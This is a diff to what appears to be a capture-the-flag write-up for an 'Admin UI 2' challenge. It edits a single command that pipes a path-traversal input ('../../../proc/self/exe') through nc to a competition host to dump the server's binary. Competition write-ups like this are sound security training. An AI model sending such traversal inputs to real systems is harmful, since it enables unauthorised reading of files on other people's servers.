@@ -55,5 +55,5 @@ Yep, that's it.
 ## Admin UI 2
 
 ```
-$ echo -e "2\n../../../proc/self/exe" | nc mngmnt-iface.ctfcompetition.com 1337 > data.bin
+$ echo -e "2\n../../../proc/self/exe\n3" | nc mngmnt-iface.ctfcompetition.com 1337 > data.bin
 ```
